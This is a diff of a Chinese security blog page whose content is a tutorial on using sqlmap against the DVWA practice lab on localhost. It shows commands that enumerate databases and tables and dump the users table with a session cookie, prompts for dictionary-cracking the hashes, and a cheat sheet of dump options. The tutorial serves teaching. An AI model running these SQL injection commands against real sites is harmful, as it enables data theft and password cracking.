@@ -511,7 +511,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="42">
-<input type="hidden" id="yelog_site_word_count" value="93.1k">
+<input type="hidden" id="yelog_site_word_count" value="92k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -876,18 +876,18 @@
         </a>
         
         <a  class="全部文章 CTF刷题 Crypto "
-           href="/2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"
-           data-tag="Crypto"
-           data-author="" >
-            <span class="post-title" title="Bugku密码学（一）">Bugku密码学（一）</span>
-            <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
-        </a>
-        
-        <a  class="全部文章 CTF刷题 Crypto "
            href="/2019/07/14/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E5%AF%86%E7%A0%81%E5%AD%A6/"
            data-tag="Crypto"
            data-author="" >
             <span class="post-title" title="实验吧--密码学">实验吧--密码学</span>
+            <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
+        </a>
+        
+        <a  class="全部文章 CTF刷题 Crypto "
+           href="/2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"
+           data-tag="Crypto"
+           data-author="" >
+            <span class="post-title" title="Bugku密码学（一）">Bugku密码学（一）</span>
             <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
         </a>
         
@@ -1143,18 +1143,20 @@
 <li>6：同时显示HTTP响应页面。</li>
 </ul>
 <p>如果想看到 Sqlmap 发送的测试 payload 最好的等级就是3，例：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -v <span class="number">3</span> -u <span class="string">&quot;http://www.xxx.com/a.php?id=xxx&quot;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">python sqlmap.py -v 3 -u &quot;http://www.xxx.com/a.php?id=xxx&quot;</code></pre>
 <p> <strong>4、测试Sqlmap</strong>：</p>
 <p>这里使用DVWA靶场进行测试,在DVWA页面中选择 SQL Injection</p>
 <p><img src="https://img-blog.csdnimg.cn/20201105173214418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>一、首先肯定是要判断是否有注入漏洞，在输入框输入1，返回</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 1</span><br><span class="line">First name: admin</span><br><span class="line">Surname: admin</span><br></pre></td></tr></table></figure>
+<pre><code>ID: 1
+First name: admin
+Surname: admin</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20201105174614243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>返回正常；</p>
 <p>再次输入<code>1&#39;</code>，报错，返回</p>
 <p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near  “ <code>1&#39;</code> “  at line 1</p>
 <p><img src="https://img-blog.csdnimg.cn/20201105204730652.png#pic_center" alt="在这里插入图片描述"><br>此时可以断定有SQL注入漏洞且为单引号闭合的字符型注入，下面利用SQLMap进行注入攻击。</p>
 <p>二、利用Sqlmap工具：</p>
 <p>1、先进行基本的测试</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/DVWA/vulnerabilities/sqli/index.php?id=1&amp;Submit=Submit&quot;</span> </span><br></pre></td></tr></table></figure>
+<pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/index.php?id=1&amp;Submit=Submit&quot; </code></pre>
 <p><code>-u</code> 参数表示url，指定连接目标</p>
 <p>得到提示：</p>
 <p><img src="https://img-blog.csdnimg.cn/2020110520533660.png#pic_center" alt="在这里插入图片描述"><br>Sqlmap 得到302重定向到 “ <a target="_blank" rel="noopener" href="http://localhost/DVWA/login.php">http://localhost:80/DVWA/login.php</a> “。你想跟上吗？[y/n]</p>
@@ -1164,36 +1166,65 @@
 </blockquote>
 <p>不加则如下：</p>
 <p><img src="https://img-blog.csdnimg.cn/20201105210027467.png#pic_center" alt="在这里插入图片描述"><br>F12打开控制台，在网络里得到Cookie信息。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID	<span class="string">&quot;lqumo7do6sle0vl4gi7b9qqd57&quot;</span></span><br><span class="line">security	<span class="string">&quot;low&quot;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="java">PHPSESSID    &quot;lqumo7do6sle0vl4gi7b9qqd57&quot;
+security    &quot;low&quot;</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20201105210545491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="M6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center)"><br>加上带cookie参数再次测试：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> python sqlmap.py -u <span class="string">&quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie <span class="string">&quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;sec</span></span><br><span class="line"><span class="string">urity=low&quot;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python"> python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;sec
+urity=low&quot;</code></pre>
 <p>得到：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">the back<span class="operator">-</span><span class="keyword">end</span> DBMS <span class="keyword">is</span> MySQL <span class="operator">/</span><span class="operator">/</span>后台数据库管理系统：MySQL</span><br><span class="line">web server operating <span class="keyword">system</span>: Windows <span class="operator">/</span><span class="operator">/</span>Web服务武器操作系统：Windows</span><br><span class="line">web application technology: PHP <span class="number">5.4</span><span class="number">.45</span>, Apache <span class="number">2.4</span><span class="number">.23</span> <span class="operator">/</span><span class="operator">/</span>Web应用技术： PHP <span class="number">5.4</span><span class="number">.45</span>, Apache <span class="number">2.4</span><span class="number">.23</span> </span><br><span class="line">back<span class="operator">-</span><span class="keyword">end</span> DBMS: MySQL <span class="operator">&gt;=</span> <span class="number">5.0</span> <span class="operator">/</span><span class="operator">/</span>后台数据库：MySQL</span><br></pre></td></tr></table></figure>
+<pre><code class="sql">the back-end DBMS is MySQL //后台数据库管理系统：MySQL
+web server operating system: Windows //Web服务武器操作系统：Windows
+web application technology: PHP 5.4.45, Apache 2.4.23 //Web应用技术： PHP 5.4.45, Apache 2.4.23 
+back-end DBMS: MySQL &gt;= 5.0 //后台数据库：MySQL</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20201105212241569.png#pic_center" alt="在这里插入图片描述"><br>发现sqlmap可以跑出数据来了，构造其他语句，继续查取数据。</p>
 <p>2、列出数据库信息：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie <span class="string">&quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;s ecurity=low&quot;</span> --dbs</span><br></pre></td></tr></table></figure>
+<pre><code class="java">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;s ecurity=low&quot; --dbs</code></pre>
 <p><code>--dbs</code> 表示列出目标有哪些数据库</p>
 <p>得到8个mysql下数据库名：<br><img src="https://img-blog.csdnimg.cn/20201105214939645.png" alt="在这里插入图片描述"></p>
 <p>3、获取当前的数据库：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie <span class="string">&quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot;</span> --current-db</span><br></pre></td></tr></table></figure>
+<pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --current-db</code></pre>
 <p>  <code>--current-db</code>得到当前使用的数据库</p>
 <p><img src="https://img-blog.csdnimg.cn/20201105215718669.png#pic_center" alt="在这里插入图片描述"><br>得到：<code>current database: &#39;dvwa&#39;</code></p>
 <p>即：当前数据库名为：dvwa</p>
 <p>4、获取当前数据库下的表：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie <span class="string">&quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot;</span> --table -D <span class="string">&quot;dvwa&quot;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --table -D &quot;dvwa&quot;</code></pre>
 <p><code>--table -D &quot;xxx&quot;</code> ：得到xxx数据库下面的表<br><img src="https://img-blog.csdnimg.cn/20201105221313664.png" alt="在这里插入图片描述"><br>5、获取数据库dvwa下user表的字段：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie <span class="string">&quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot;</span> --columns -T <span class="string">&quot;users&quot;</span> -D <span class="string">&quot;dvwa&quot;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --columns -T &quot;users&quot; -D &quot;dvwa&quot;</code></pre>
 <p><code>--columns -T &quot;&quot; -D &quot;&quot;</code> 得到数据库下面的表下面的列(columns)</p>
 <p>得到：<br><img src="https://img-blog.csdnimg.cn/2020110522281247.png" alt="在这里插入图片描述"></p>
 <p>6、获取user表里的字段值：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie <span class="string">&quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot;</span> --dump -T users -D dvwa  </span><br></pre></td></tr></table></figure>
+<pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --dump -T users -D dvwa  </code></pre>
 <p>过程中会出现的部分提示信息：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> you want to store hashes to a temporary file <span class="keyword">for</span> eventual further processing with other tools [y/N]</span><br><span class="line">您是否要将散列存储到临时文件中，以便最终使用其他工具进行进一步处理</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> you want to crack them via a dictionary-based attack? [Y/n/q]</span><br><span class="line">您是否想通过基于字典的攻击来破解它们？</span><br><span class="line"></span><br><span class="line">what dictionary <span class="keyword">do</span> you want to use?</span><br><span class="line">用什么字典来破解？</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>] <span class="keyword">default</span> dictionary file <span class="string">&#x27;C:\WangAn\Sqlmap\txt\wordlist.zip&#x27;</span> (press Enter)</span><br><span class="line">[<span class="number">2</span>] custom dictionary file</span><br><span class="line">[<span class="number">3</span>] file with list of dictionary files</span><br><span class="line">回车会直接使用第一个</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> you want to use common password suffixes? (slow!) [y/N]</span><br><span class="line">您是否要使用通用密码后缀？ （慢！）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="java">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]
+您是否要将散列存储到临时文件中，以便最终使用其他工具进行进一步处理
+
+do you want to crack them via a dictionary-based attack? [Y/n/q]
+您是否想通过基于字典的攻击来破解它们？
+
+what dictionary do you want to use?
+用什么字典来破解？
+
+[1] default dictionary file &#39;C:\WangAn\Sqlmap\txt\wordlist.zip&#39; (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+回车会直接使用第一个
+
+do you want to use common password suffixes? (slow!) [y/N]
+您是否要使用通用密码后缀？ （慢！）
+</code></pre>
 <p>最终得到：<br><img src="https://img-blog.csdnimg.cn/2020110523301156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>至此，dvwa的low级别使用SQLMap工具注入完成。</p>
 <p><strong>下面是一些Sqlmap常用选项：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;注入地址&quot;</span> --dbs          // 列举数据库</span><br><span class="line">sqlmap -u <span class="string">&quot;注入地址&quot;</span> --tables -D <span class="string">&quot;数据库&quot;</span> // 列举数据库的表名</span><br><span class="line">sqlmap -u <span class="string">&quot;注入地址&quot;</span> --columns -T <span class="string">&quot;表名&quot;</span> -D <span class="string">&quot;数据库&quot;</span> // 获取表的列名</span><br><span class="line">sqlmap -u <span class="string">&quot;注入地址&quot;</span> --dump  -T <span class="string">&quot;表名&quot;</span> -D <span class="string">&quot;数据库&quot;</span> // 获取表中指定字段的数据</span><br><span class="line">sqlmap -u <span class="string">&quot;注入地址&quot;</span> --dump -C <span class="string">&quot;字段,字段&quot;</span> -T <span class="string">&quot;表名&quot;</span> -D <span class="string">&quot;数据库&quot;</span> // 获取表中的所有数据</span><br><span class="line"></span><br><span class="line">sqlmap -r <span class="string">&quot;含http头的文件&quot;</span> --dbs          // 列举数据库</span><br><span class="line">sqlmap -r <span class="string">&quot;含http头的文件&quot;</span> --tables -D <span class="string">&quot;数据库&quot;</span> // 列举数据库的表名</span><br><span class="line">sqlmap -r <span class="string">&quot;含http头的文件&quot;</span> --columns -T <span class="string">&quot;表名&quot;</span> -D <span class="string">&quot;数据库&quot;</span> // 获取表的列名</span><br><span class="line">sqlmap -r <span class="string">&quot;注入地址&quot;</span> --dump  -T <span class="string">&quot;表名&quot;</span> -D <span class="string">&quot;数据库&quot;</span> // 获取表中指定字段的数据</span><br><span class="line">sqlmap -r <span class="string">&quot;含http头的文件&quot;</span> --dump -C <span class="string">&quot;字段,字段&quot;</span> -T <span class="string">&quot;表名&quot;</span> -D <span class="string">&quot;数据库&quot;</span> // 获取表中的所有数据</span><br></pre></td></tr></table></figure>
+<pre><code class="python">sqlmap -u &quot;注入地址&quot; --dbs          // 列举数据库
+sqlmap -u &quot;注入地址&quot; --tables -D &quot;数据库&quot; // 列举数据库的表名
+sqlmap -u &quot;注入地址&quot; --columns -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表的列名
+sqlmap -u &quot;注入地址&quot; --dump  -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表中指定字段的数据
+sqlmap -u &quot;注入地址&quot; --dump -C &quot;字段,字段&quot; -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表中的所有数据
 
-
+sqlmap -r &quot;含http头的文件&quot; --dbs          // 列举数据库
+sqlmap -r &quot;含http头的文件&quot; --tables -D &quot;数据库&quot; // 列举数据库的表名
+sqlmap -r &quot;含http头的文件&quot; --columns -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表的列名
+sqlmap -r &quot;注入地址&quot; --dump  -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表中指定字段的数据
+sqlmap -r &quot;含http头的文件&quot; --dump -C &quot;字段,字段&quot; -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表中的所有数据</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2058751973@qq.com </span>
